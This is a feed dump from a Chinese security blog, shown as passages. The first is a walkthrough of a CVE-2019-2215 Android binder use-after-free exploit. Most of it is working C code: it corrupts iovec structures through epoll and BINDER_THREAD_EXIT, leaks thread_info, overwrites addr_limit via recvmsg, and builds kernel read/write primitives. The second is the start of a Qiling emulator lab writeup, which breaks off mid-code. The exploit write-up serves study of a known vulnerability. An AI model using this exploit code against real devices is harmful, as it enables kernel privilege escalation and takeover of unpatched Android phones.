class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">// wq-&gt;task_list-&gt;next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>;<span class="comment">// wq-&gt;task_list-&gt;prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure><p>构造好之后，首先因为iovec数组的前10都是0所以直接跳过了，然后iovec[10].iov_len和管道的大小一样所以父进程调用writev函数从iovec[10].iov_base读取dummy_page数据到管道导致管道被阻塞，子进程触发UAF&#x2F;unlink破坏iovec结构再读取管道解除了阻塞，这个时候父进程再调用writev函数从iovec[11].iov_base读取内核数据到管道再读取管道。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;.events = EPOLLIN&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line"><span class="type">char</span> leakBuff[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> byteSent;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))</span><br><span class="line">    exitWithError(<span class="string">&quot;EPOLL_CTL_ADD failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">// linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pipe(pipefd))</span><br><span class="line">    exitWithError(<span class="string">&quot;Pipe failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fcntl(pipefd[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>) != <span class="number">0x1000</span>)</span><br><span class="line">    exitWithError(<span class="string">&quot;F_SETPIPE_SZ failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(pipefd[<span class="number">0</span>], leakBuff, <span class="keyword">sizeof</span>(leakBuff)) != <span class="keyword">sizeof</span>(leakBuff))</span><br><span class="line">        exitWithError(<span class="string">&quot;[CHILD] Read failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">byteSent = writev(pipefd[<span class="number">1</span>], iovec_array, IOVEC_ARRAY_SZ);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(byteSent != <span class="number">0x2000</span>)</span><br><span class="line">    exitWithError(<span class="string">&quot;[PARENT] Leak failed: writev returned %d, expected 0x2000.&quot;</span>, byteSent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(read(pipefd[<span class="number">0</span>], leakBuff, <span class="keyword">sizeof</span>(leakBuff)) != <span class="keyword">sizeof</span>(leakBuff))</span><br><span class="line">    exitWithError(<span class="string">&quot;[PARENT] Read failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">__android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;EXPLOIT&quot;</span>, <span class="string">&quot;leak + 0xE8 = %lx\n&quot;</span>, *(<span class="type">uint64_t</span> *)(leakBuff + <span class="number">0xE8</span>));</span><br><span class="line">thread_info = *(<span class="type">unsigned</span> <span class="type">long</span> *)(leakBuff + <span class="number">0xE8</span>); <span class="comment">//泄露这个结构体</span></span><br></pre></td></tr></table></figure><p>thread_info 结构体的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;      <span class="comment">/* low level flags */</span></span><br><span class="line">    <span class="type">mm_segment_t</span>        addr_limit; <span class="comment">/* address limit */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">task</span>;</span>      <span class="comment">/* main task structure */</span></span><br><span class="line">    <span class="type">int</span>         preempt_count;      <span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span></span><br><span class="line">    <span class="type">int</span>         cpu;               <span class="comment">/* cpu */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有一些非常重要的与安全有关的宏引用了addr_limit字段。其中access_ok如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> access_ok(type, addr, size) __range_ok(addr, size)</span></span><br></pre></td></tr></table></figure><p>从__range_ok的注释可得知它基本上等同于(u65)addr + (u65)size  &lt;&#x3D;  current-&gt;addr_limit，在内核态尝试访问用户态提供的指针时，几乎都会使用此宏。它确保所提供的指针确实是一个用户态指针，从而防止在内核态中使用用户态指针传递内核态指针。一旦addr_limit的限制被突破就可以自由地向用户态指针地址传递内核态指针，且access_ok将永远不会失败。</p><p>为了泄漏内核数据，我们将iovec结构体写入文件描述符中，并使用unlink覆写其中的一个结构体，以便read函数能泄漏数据。要覆写内核数据，我们可以采用另一种方法。就是通过使用iovec结构体调用recvmsg函数并以相同的方式对其进行覆写，我们可以使用write函数将写入的数据覆写到相继的iovec结构体上以获得任意写入。recvmsg函数覆盖UAF对象的iovec结构体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">1</span>; <span class="comment">// linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>; <span class="comment">// iov_len of previous, then this element and next element</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xBEEFDEAD</span>;</span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>unlink使用内核指针覆盖了<code>IOVEC_INDX_FOR_WQ</code>处的iovec.iov_len和<code>IOVEC_INDX_FOR_WQ+1</code><br>处的iovec.iov_base，一旦recvmsg函数被调用，它将通过write函数写入的数据到，这时可以任意数据写入后面经过验证的iovec结构体中，也就是说可以将任何指针传递给下一个iovec.iov_base<br>，从而实现了任意写。查看写入的数据，可以看到它确实与<code>IOVEC_INDX_FOR_WQ</code>处的iov_len<br>以后的数据对齐。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> second_write_chunk[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="comment">/* iov_len */</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment">/* iov_base (already used) */</span></span><br><span class="line">    <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>, <span class="comment">/* iov_len (already used) */</span></span><br><span class="line">    current_ptr + <span class="number">0x8</span>, <span class="comment">/* next iov_base (addr_limit) */</span></span><br><span class="line">    <span class="number">8</span>, <span class="comment">/* next iov_len (sizeof(addr_limit)) */</span></span><br><span class="line">    <span class="number">0xfffffffffffffffe</span> <span class="comment">/* value to write */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改之后的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET_OF_ADDR_LIMIT 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;.events = EPOLLIN&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line"><span class="type">int</span> iovec_corruption_payload_sz;</span><br><span class="line"><span class="type">int</span> sockfd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> byteSent;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))</span><br><span class="line">    exitWithError(<span class="string">&quot;EPOLL_CTL_ADD failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> iovec_corruption_payload[] = &#123;</span><br><span class="line">        <span class="number">1</span>,                  <span class="comment">// IOVEC_INDX_FOR_WQ -&gt; iov_len</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>,         <span class="comment">// IOVEC_INDX_FOR_WQ + 1 -&gt; iov_base</span></span><br><span class="line">        <span class="number">0x8</span> + (<span class="number">2</span> * <span class="number">0x10</span>),   <span class="comment">// IOVEC_INDX_FOR_WQ + 1 -&gt; iov_len</span></span><br><span class="line">        thread_info + OFFSET_OF_ADDR_LIMIT, <span class="comment">// Arb. Write location! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_base</span></span><br><span class="line">        <span class="number">8</span>,                  <span class="comment">// Arb. Write size (only need a QWORD)! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_len</span></span><br><span class="line">        <span class="number">0xfffffffffffffffe</span>, <span class="comment">// Arb. Write value! Smash it so we can write anywhere.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">iovec_corruption_payload_sz = <span class="keyword">sizeof</span>(iovec_corruption_payload);</span><br><span class="line"></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len  = <span class="number">1</span>; <span class="comment">// only ask for one byte since we&#x27;ll only write one byte - linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len  = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>;     <span class="comment">// length of previous iovec + this one + the next one</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xBEEFDEAD</span>; <span class="comment">// will get smashed by iovec_corruption_payload</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len  = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sockfd))</span><br><span class="line">    exitWithError(<span class="string">&quot;Socket pair failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Preemptively satisfy the first iovec request</span></span><br><span class="line"><span class="keyword">if</span>(write(sockfd[<span class="number">1</span>], <span class="string">&quot;X&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">    exitWithError(<span class="string">&quot;Write 1 byte failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);</span><br><span class="line"></span><br><span class="line">    byteSent = write(sockfd[<span class="number">1</span>], iovec_corruption_payload, iovec_corruption_payload_sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(byteSent != iovec_corruption_payload_sz)</span><br><span class="line">        exitWithError(<span class="string">&quot;[CHILD] Write returned %d, expected %d.&quot;</span>, byteSent, iovec_corruption_payload_sz);</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;</span><br><span class="line">        .msg_iov = iovec_array,</span><br><span class="line">        .msg_iovlen = IOVEC_ARRAY_SZ</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">recvmsg(sockfd[<span class="number">0</span>], &amp;msg, MSG_WAITALL);</span><br></pre></td></tr></table></figure><p>最后，这一进程地址限制已经被绕过，任意内核读写很简单，只要几个read和write系统调用。通过write将想要写入的数据写到管道，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。相反，通过write将数据从一个内核地址写入管道，然后在管道的另一端调用read，就可以从该内核地址读取数据。成功实现任意读写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> kernel_rw_pipe[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pipe(kernel_rw_pipe))</span><br><span class="line">    exitWithError(<span class="string">&quot;Kernel R/W Pipe failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *data, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">0x1000</span>)</span><br><span class="line">        exitWithError(<span class="string">&quot;Reads/writes over the size of a page results causes issues.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write(kernel_rw_pipe[<span class="number">1</span>], data, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to write data to kernel (write)!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(kernel_rw_pipe[<span class="number">0</span>], (<span class="type">void</span> *)kaddr, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to write data to kernel (read)!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *data, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">0x1000</span>)</span><br><span class="line">        exitWithError(<span class="string">&quot;Reads/writes over the size of a page results causes issues.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write(kernel_rw_pipe[<span class="number">1</span>], (<span class="type">void</span> *)kaddr, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to read data from kernel (write)!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(kernel_rw_pipe[<span class="number">0</span>], data, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to read data from kernel (read)!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>binder驱动程序具有清理例程，可以通过ioctl函数在实际关闭驱动程序之前触发该例程。这是个binder IPC子系统中的Use after Free漏洞，binder_thread-&gt;waitqueue成员链表中链接了epoll data结构，但当调用了BINDER_THREAD_EXIT对应的方法，就会导致binder_thread被释放，当程序结束的时候，epoll相应的结构重复遍历到此成员，造成UAF。</p><p>参考链接：</p><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-2215.html">https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-2215.html</a></p><p><a href="https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/">https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/</a></p><p><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Qiling framwork lab</title>
      <link href="/2023/06/29/Qiling-framwork-lab/"/>
      <url>/2023/06/29/Qiling-framwork-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="challenge1-操作内存"><a href="#challenge1-操作内存" class="headerlink" title="challenge1:操作内存"></a>challenge1:操作内存</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled.png" class title="Untitled"><p>可以看到程序需要读取内存地址0x1337的未映射全局变量，需要我们让内存0x1337上存放一个值为1337</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.mem.<span class="built_in">map</span>(<span class="number">0x1000</span>, <span class="number">0x1000</span>, info = <span class="string">&#x27;[challenge1]&#x27;</span>)</span><br><span class="line">    <span class="comment">#q1.mem.map(addr, size) 注意要4k对齐</span></span><br><span class="line">    q1.mem.write(<span class="number">0x1337</span>,q1.pack16(<span class="number">1337</span>)) <span class="comment"># pack16(value) == struct.pack(&#x27;H&#x27;, value)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = [<span class="string">&#x27;qilinglab-aarch64&#x27;</span>]</span><br><span class="line">    rootfs = <span class="string">&quot;./qiling/examples/rootfs/arm64_linux&quot;</span> <span class="comment">#需要对应架构模拟的文件系统</span></span><br><span class="line">    q1 = Qiling(path,rootfs)</span><br><span class="line">    challenge1(q1)</span><br><span class="line">    q1.verbose = <span class="number">0</span> <span class="comment">#方便看输出</span></span><br><span class="line"><span class="comment">#q1.mem.show_mapinfo()</span></span><br><span class="line">    q1.run()</span><br></pre></td></tr></table></figure><img src="/2023/06/29/Qiling-framwork-lab/Untitled1.png" class title="Untitled"><h1 id="Chanllenge2-Syscall-return-hijack"><a href="#Chanllenge2-Syscall-return-hijack" class="headerlink" title="Chanllenge2:Syscall return hijack"></a>Chanllenge2:Syscall return hijack</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled2.png" class title="Untitled"><p>需要我们在返回之前hook uname系统调用，并修改uname的sysname变量为QilingOS、version变量为ChallengeStart才能过检查。</p><p>uname的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">utsname</span> &#123;</span><br><span class="line">    <span class="type">char</span> sysname[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> nodename[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> release[<span class="number">65</span>];   </span><br><span class="line">    <span class="type">char</span> version[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> machine[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> domainname[<span class="number">65</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//uname系统调用，接收一个buf，返回由buf指向的结构中的系统信息。</span></span><br><span class="line">        <span class="number">00100</span>d28 e0 <span class="number">03</span> <span class="number">01</span> <span class="number">91</span>     add        check,sp,#<span class="number">0x40</span></span><br><span class="line">        <span class="number">00100</span>d2c a1 ff ff <span class="number">97</span>     bl         &lt;EXTERNAL&gt;::<span class="function">uname                                <span class="type">int</span> <span class="title">uname</span><span class="params">(utsname * __name)</span></span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_uname_on_exit_hook</span>(<span class="params">q1, *args</span>):</span><br><span class="line">    <span class="comment">#uname结构体存放在栈偏移0x40位置</span></span><br><span class="line">    out_struct_addr = q1.arch.regs.sp + <span class="number">0x40</span></span><br><span class="line">    sysname_addr = out_struct_addr</span><br><span class="line">    q1.mem.write(sysname_addr, <span class="string">b&#x27;QilingOS\x00&#x27;</span>)</span><br><span class="line">    version_addr = out_struct_addr + <span class="number">65</span>*<span class="number">3</span></span><br><span class="line">    q1.mem.write(version_addr, <span class="string">b&#x27;ChallengeStart\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">q1</span>):</span><br><span class="line">    <span class="comment"># QL_INTERCEPT.EXIT 可以在系统调用之后触发hook</span></span><br><span class="line">    q1.os.set_syscall(<span class="string">&quot;uname&quot;</span>,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><h1 id="Challenge3-FS-amp-Syscall-hijack"><a href="#Challenge3-FS-amp-Syscall-hijack" class="headerlink" title="Challenge3:FS &amp; Syscall hijack"></a>Challenge3:FS &amp; Syscall hijack</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled3.png" class title="Untitled"><p>分别从&#x2F;dev&#x2F;urandom和getrandom提取0x20字节，必须满足提取的字节相同且从与从&#x2F;dev&#x2F;urandom读取的那一个字节都不相同。</p><ul><li>使用set_syscall可以劫持getrandom系统调用返回<code>00</code>字节</li><li>使用add_fs_mapper和Q1FsMappedObject参数定义一个&#x2F;dev&#x2F;urandom的自定义行为，使其返回<code>00</code>字节</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fake_urandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line">    <span class="comment"># 覆盖/dev/urandom</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x00&quot;</span>*size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span 